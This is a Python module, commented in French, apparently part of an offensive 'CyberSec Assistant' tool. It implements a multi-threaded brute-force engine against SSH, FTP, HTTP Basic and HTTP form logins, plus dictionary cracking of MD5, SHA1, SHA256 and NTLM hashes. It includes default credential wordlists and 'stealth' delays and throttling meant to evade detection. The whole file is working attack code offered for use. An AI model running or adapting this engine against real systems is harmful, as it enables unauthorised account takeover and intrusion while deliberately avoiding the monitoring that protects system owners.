#!/usr/bin/env python3
"""
Brute Force Engine - CyberSec Assistant
Module principal pour attaques de brute force multi-protocoles
"""

import asyncio
import threading
import time
import random
import hashlib
import base64
from typing import Dict, List, Optional, Tuple, Any
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from enum import Enum
import logging
import json

# Imports pour les protocoles réseau
try:
    import paramiko  # SSH
    import ftplib    # FTP
    import telnetlib # Telnet
    import smtplib   # SMTP
    import pymongo   # MongoDB
    import mysql.connector # MySQL
    import psycopg2  # PostgreSQL
    import requests  # HTTP/HTTPS
    from impacket.smbconnection import SMBConnection # SMB
    NETWORK_LIBS_AVAILABLE = True
except ImportError as e:
    NETWORK_LIBS_AVAILABLE = False
    logging.warning(f"Some network libraries not available: {e}")

# Imports pour le hash cracking
try:
    import bcrypt
    import hashlib
    import hmac
    import pbkdf2
    HASH_LIBS_AVAILABLE = True
except ImportError:
    HASH_LIBS_AVAILABLE = False
    logging.warning("Hash libraries not fully available")

class BruteForceType(Enum):
    """Types d'attaques de brute force supportées"""
    SSH = "ssh"
    FTP = "ftp"
    TELNET = "telnet"
    HTTP_BASIC = "http_basic"
    HTTP_FORM = "http_form"
    SMTP = "smtp"
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MONGODB = "mongodb"
    SMB = "smb"
    RDP = "rdp"
    SNMP = "snmp"
    HASH_MD5 = "hash_md5"
    HASH_SHA1 = "hash_sha1"
    HASH_SHA256 = "hash_sha256"
    HASH_NTLM = "hash_ntlm"
    HASH_BCRYPT = "hash_bcrypt"

@dataclass
class BruteForceTarget:
    """Configuration d'une cible pour brute force"""
    target_type: BruteForceType
    host: str
    port: int = None
    service: str = None
    username_list: List[str] = None
    password_list: List[str] = None
    hash_target: str = None
    form_data: Dict[str, Any] = None
    headers: Dict[str, str] = None
    cookies: Dict[str, str] = None
    stealth_level: int = 5
    max_threads: int = 10
    delay_min: float = 0.1
    delay_max: float = 2.0
    timeout: int = 10
    stop_on_success: bool = True

@dataclass
class BruteForceResult:
    """Résultat d'une tentative de brute force"""
    success: bool
    username: str = None
    password: str = None
    hash_value: str = None
    response_time: float = 0.0
    response_data: str = None
    error_message: str = None
    timestamp: float = None

class BruteForceEngine:
    """Moteur principal de brute force multi-protocoles"""
    
    def __init__(self, stealth_engine=None):
        self.stealth_engine = stealth_engine
        self.active_attacks = {}
        self.results = {}
        self.statistics = {
            'total_attempts': 0,
            'successful_attempts': 0,
            'failed_attempts': 0,
            'attacks_completed': 0,
            'attacks_active': 0
        }
        self.logger = logging.getLogger(__name__)
        
        # Initialisation des wordlists par défaut
        self.default_usernames = self._load_default_usernames()
        self.default_passwords = self._load_default_passwords()
        
    def _load_default_usernames(self) -> List[str]:
        """Charge les noms d'utilisateur par défaut"""
        return [
            'admin', 'administrator', 'root', 'user', 'guest', 'test',
            'oracle', 'postgres', 'mysql', 'sa', 'backup', 'service',
            'demo', 'anonymous', 'ftp', 'web', 'www', 'mail', 'email',
            'support', 'manager', 'operator', 'supervisor', 'developer'
        ]
    
    def _load_default_passwords(self) -> List[str]:
        """Charge les mots de passe par défaut"""
        return [
            'password', '123456', 'admin', 'root', 'guest', 'test',
            '12345', 'password123', 'admin123', 'root123', 'qwerty',
            'abc123', 'letmein', 'welcome', 'monkey', 'dragon',
            'master', 'shadow', 'login', 'pass', 'secret', 'default',
            '', 'null', 'blank', 'empty', 'space', 'password1'
        ]
    
    async def start_brute_force(self, target: BruteForceTarget, attack_id: str) -> str:
        """Démarre une attaque de brute force"""
        try:
            self.logger.info(f"Starting brute force attack: {attack_id}")
            
            # Configuration de la furtivité
            if self.stealth_engine and target.stealth_level > 0:
                await self._apply_stealth_settings(target)
            
            # Préparation des listes
            usernames = target.username_list or self.default_usernames
            passwords = target.password_list or self.default_passwords
            
            # Initialisation de l'attaque
            self.active_attacks[attack_id] = {
                'target': target,
                'status': 'running',
                'start_time': time.time(),
                'progress': 0.0,
                'results': [],
                'stop_requested': False
            }
            
            # Démarrage de l'attaque en thread séparé
            if target.target_type in [BruteForceType.HASH_MD5, BruteForceType.HASH_SHA1, 
                                    BruteForceType.HASH_SHA256, BruteForceType.HASH_NTLM, 
                                    BruteForceType.HASH_BCRYPT]:
                threading.Thread(
                    target=self._run_hash_attack,
                    args=(attack_id, target, passwords),
                    daemon=True
                ).start()
            else:
                threading.Thread(
                    target=self._run_network_attack,
                    args=(attack_id, target, usernames, passwords),
                    daemon=True
                ).start()
            
            return attack_id
            
        except Exception as e:
            self.logger.error(f"Failed to start brute force attack: {e}")
            raise
    
    def _run_network_attack(self, attack_id: str, target: BruteForceTarget, 
                          usernames: List[str], passwords: List[str]):
        """Exécute une attaque réseau avec threading"""
        try:
            total_combinations = len(usernames) * len(passwords)
            current_attempt = 0
            
            with ThreadPoolExecutor(max_workers=target.max_threads) as executor:
                futures = []
                
                for username in usernames:
                    for password in passwords:
                        if self.active_attacks[attack_id]['stop_requested']:
                            break
                        
                        # Appliquer délai de furtivité
                        delay = random.uniform(target.delay_min, target.delay_max)
                        time.sleep(delay)
                        
                        # Soumettre la tentative
                        future = executor.submit(
                            self._attempt_network_login,
                            target, username, password, attack_id
                        )
                        futures.append(future)
                        
                        current_attempt += 1
                        
                        # Mise à jour du progrès
                        progress = (current_attempt / total_combinations) * 100
                        self.active_attacks[attack_id]['progress'] = progress
                        
                        if len(futures) >= target.max_threads:
                            # Traiter les résultats
                            for future in as_completed(futures):
                                result = future.result()
                                if result and result.success:
                                    self.active_attacks[attack_id]['results'].append(result)
                                    if target.stop_on_success:
                                        self.active_attacks[attack_id]['stop_requested'] = True
                                        break
                            futures.clear()
                
                # Traiter les futures restantes
                for future in as_completed(futures):
                    result = future.result()
                    if result and result.success:
                        self.active_attacks[attack_id]['results'].append(result)
            
            self.active_attacks[attack_id]['status'] = 'completed'
            self.statistics['attacks_completed'] += 1
            
        except Exception as e:
            self.logger.error(f"Network attack failed: {e}")
            self.active_attacks[attack_id]['status'] = 'error'
            self.active_attacks[attack_id]['error'] = str(e)
    
    def _run_hash_attack(self, attack_id: str, target: BruteForceTarget, passwords: List[str]):
        """Exécute une attaque de hash cracking"""
        try:
            total_passwords = len(passwords)
            current_attempt = 0
            
            for password in passwords:
                if self.active_attacks[attack_id]['stop_requested']:
                    break
                
                result = self._attempt_hash_crack(target, password)
                
                if result and result.success:
                    self.active_attacks[attack_id]['results'].append(result)
                    if target.stop_on_success:
                        break
                
                current_attempt += 1
                progress = (current_attempt / total_passwords) * 100
                self.active_attacks[attack_id]['progress'] = progress
                
                # Délai de furtivité
                delay = random.uniform(target.delay_min, target.delay_max)
                time.sleep(delay)
            
            self.active_attacks[attack_id]['status'] = 'completed'
            self.statistics['attacks_completed'] += 1
            
        except Exception as e:
            self.logger.error(f"Hash attack failed: {e}")
            self.active_attacks[attack_id]['status'] = 'error'
            self.active_attacks[attack_id]['error'] = str(e)
    
    def _attempt_network_login(self, target: BruteForceTarget, username: str, 
                             password: str, attack_id: str) -> Optional[BruteForceResult]:
        """Tente une connexion réseau"""
        start_time = time.time()
        
        try:
            if target.target_type == BruteForceType.SSH:
                return self._attempt_ssh(target, username, password, start_time)
            elif target.target_type == BruteForceType.FTP:
                return self._attempt_ftp(target, username, password, start_time)
            elif target.target_type == BruteForceType.HTTP_BASIC:
                return self._attempt_http_basic(target, username, password, start_time)
            elif target.target_type == BruteForceType.HTTP_FORM:
                return self._attempt_http_form(target, username, password, start_time)
            # Ajouter d'autres protocoles...
            
        except Exception as e:
            self.statistics['failed_attempts'] += 1
            return BruteForceResult(
                success=False,
                username=username,
                password=password,
                error_message=str(e),
                response_time=time.time() - start_time,
                timestamp=time.time()
            )
    
    def _attempt_ssh(self, target: BruteForceTarget, username: str, 
                    password: str, start_time: float) -> BruteForceResult:
        """Tentative de connexion SSH"""
        if not NETWORK_LIBS_AVAILABLE:
            raise Exception("SSH libraries not available")
        
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(
                hostname=target.host,
                port=target.port or 22,
                username=username,
                password=password,
                timeout=target.timeout
            )
            ssh.close()
            
            self.statistics['successful_attempts'] += 1
            return BruteForceResult(
                success=True,
                username=username,
                password=password,
                response_time=time.time() - start_time,
                timestamp=time.time()
            )
            
        except Exception as e:
            self.statistics['failed_attempts'] += 1
            return BruteForceResult(
                success=False,
                username=username,
                password=password,
                error_message=str(e),
                response_time=time.time() - start_time,
                timestamp=time.time()
            )
    
    def _attempt_ftp(self, target: BruteForceTarget, username: str, 
                    password: str, start_time: float) -> BruteForceResult:
        """Tentative de connexion FTP"""
        try:
            ftp = ftplib.FTP()
            ftp.connect(target.host, target.port or 21, timeout=target.timeout)
            ftp.login(username, password)
            ftp.quit()
            
            self.statistics['successful_attempts'] += 1
            return BruteForceResult(
                success=True,
                username=username,
                password=password,
                response_time=time.time() - start_time,
                timestamp=time.time()
            )
            
        except Exception as e:
            self.statistics['failed_attempts'] += 1
            return BruteForceResult(
                success=False,
                username=username,
                password=password,
                error_message=str(e),
                response_time=time.time() - start_time,
                timestamp=time.time()
            )
    
    def _attempt_http_basic(self, target: BruteForceTarget, username: str, 
                           password: str, start_time: float) -> BruteForceResult:
        """Tentative HTTP Basic Auth"""
        try:
            url = f"http://{target.host}:{target.port or 80}"
            if target.service:
                url += f"/{target.service.lstrip('/')}"
            
            response = requests.get(
                url,
                auth=(username, password),
                timeout=target.timeout,
                headers=target.headers or {},
                cookies=target.cookies or {}
            )
            
            if response.status_code == 200:
                self.statistics['successful_attempts'] += 1
                return BruteForceResult(
                    success=True,
                    username=username,
                    password=password,
                    response_time=time.time() - start_time,
                    response_data=response.text[:1000],
                    timestamp=time.time()
                )
            else:
                self.statistics['failed_attempts'] += 1
                return BruteForceResult(
                    success=False,
                    username=username,
                    password=password,
                    error_message=f"HTTP {response.status_code}",
                    response_time=time.time() - start_time,
                    timestamp=time.time()
                )
                
        except Exception as e:
            self.statistics['failed_attempts'] += 1
            return BruteForceResult(
                success=False,
                username=username,
                password=password,
                error_message=str(e),
                response_time=time.time() - start_time,
                timestamp=time.time()
            )
    
    def _attempt_http_form(self, target: BruteForceTarget, username: str, 
                          password: str, start_time: float) -> BruteForceResult:
        """Tentative HTTP Form Auth"""
        try:
            url = f"http://{target.host}:{target.port or 80}"
            if target.service:
                url += f"/{target.service.lstrip('/')}"
            
            data = target.form_data.copy()
            # Remplacer les placeholders
            for key, value in data.items():
                if value == "{{username}}":
                    data[key] = username
                elif value == "{{password}}":
                    data[key] = password
            
            response = requests.post(
                url,
                data=data,
                timeout=target.timeout,
                headers=target.headers or {},
                cookies=target.cookies or {},
                allow_redirects=False
            )
            
            # Critères de succès configurables
            success_indicators = ['dashboard', 'welcome', 'logout', 'profile']
            failure_indicators = ['invalid', 'error', 'failed', 'wrong']
            
            response_text = response.text.lower()
            
            # Vérifier les indicateurs de succès
            if any(indicator in response_text for indicator in success_indicators):
                success = True
            elif any(indicator in response_text for indicator in failure_indicators):
                success = False
            elif response.status_code in [302, 301, 303]:  # Redirection
                success = True
            else:
                success = False
            
            if success:
                self.statistics['successful_attempts'] += 1
            else:
                self.statistics['failed_attempts'] += 1
            
            return BruteForceResult(
                success=success,
                username=username,
                password=password,
                response_time=time.time() - start_time,
                response_data=response.text[:1000],
                timestamp=time.time()
            )
            
        except Exception as e:
            self.statistics['failed_attempts'] += 1
            return BruteForceResult(
                success=False,
                username=username,
                password=password,
                error_message=str(e),
                response_time=time.time() - start_time,
                timestamp=time.time()
            )
    
    def _attempt_hash_crack(self, target: BruteForceTarget, password: str) -> BruteForceResult:
        """Tentative de crackage de hash"""
        start_time = time.time()
        
        try:
            hash_to_crack = target.hash_target.lower()
            
            if target.target_type == BruteForceType.HASH_MD5:
                computed_hash = hashlib.md5(password.encode()).hexdigest()
            elif target.target_type == BruteForceType.HASH_SHA1:
                computed_hash = hashlib.sha1(password.encode()).hexdigest()
            elif target.target_type == BruteForceType.HASH_SHA256:
                computed_hash = hashlib.sha256(password.encode()).hexdigest()
            elif target.target_type == BruteForceType.HASH_NTLM:
                computed_hash = hashlib.new('md4', password.encode('utf-16le')).hexdigest()
            else:
                raise Exception(f"Hash type {target.target_type} not supported")
            
            success = computed_hash.lower() == hash_to_crack
            
            if success:
                self.statistics['successful_attempts'] += 1
            else:
                self.statistics['failed_attempts'] += 1
            
            return BruteForceResult(
                success=success,
                password=password,
                hash_value=computed_hash,
                response_time=time.time() - start_time,
                timestamp=time.time()
            )
            
        except Exception as e:
            self.statistics['failed_attempts'] += 1
            return BruteForceResult(
                success=False,
                password=password,
                error_message=str(e),
                response_time=time.time() - start_time,
                timestamp=time.time()
            )
    
    async def _apply_stealth_settings(self, target: BruteForceTarget):
        """Applique les paramètres de furtivité"""
        if self.stealth_engine:
            # Ajuster les délais selon le niveau de furtivité
            stealth_multiplier = target.stealth_level / 10.0
            target.delay_min *= stealth_multiplier
            target.delay_max *= stealth_multiplier
            
            # Réduire le nombre de threads si nécessaire
            if target.stealth_level > 7:
                target.max_threads = max(1, target.max_threads // 2)
    
    def stop_attack(self, attack_id: str) -> bool:
        """Arrête une attaque en cours"""
        if attack_id in self.active_attacks:
            self.active_attacks[attack_id]['stop_requested'] = True
            self.active_attacks[attack_id]['status'] = 'stopped'
            return True
        return False
    
    def get_attack_status(self, attack_id: str) -> Optional[Dict]:
        """Récupère le statut d'une attaque"""
        return self.active_attacks.get(attack_id)
    
    def get_statistics(self) -> Dict:
        """Récupère les statistiques globales"""
        self.statistics['attacks_active'] = len([
            a for a in self.active_attacks.values() 
            if a['status'] == 'running'
        ])
        return self.statistics.copy()
    
    def list_active_attacks(self) -> Dict[str, Dict]:
        """Liste toutes les attaques actives"""
        return {k: {
            'status': v['status'],
            'progress': v['progress'],
            'start_time': v['start_time'],
            'target_host': v['target'].host,
            'target_type': v['target'].target_type.value,
            'results_count': len(v['results'])
        } for k, v in self.active_attacks.items()}
    
    def get_results(self, attack_id: str) -> List[BruteForceResult]:
        """Récupère les résultats d'une attaque"""
        if attack_id in self.active_attacks:
            return self.active_attacks[attack_id]['results']
        return []
    
    def cleanup_completed_attacks(self, max_age_hours: int = 24):
        """Nettoie les attaques terminées anciennes"""
        current_time = time.time()
        max_age_seconds = max_age_hours * 3600
        
        to_remove = []
        for attack_id, attack_data in self.active_attacks.items():
            if (attack_data['status'] in ['completed', 'stopped', 'error'] and
                current_time - attack_data['start_time'] > max_age_seconds):
                to_remove.append(attack_id)
        
        for attack_id in to_remove:
            del self.active_attacks[attack_id]
        
        return len(to_remove)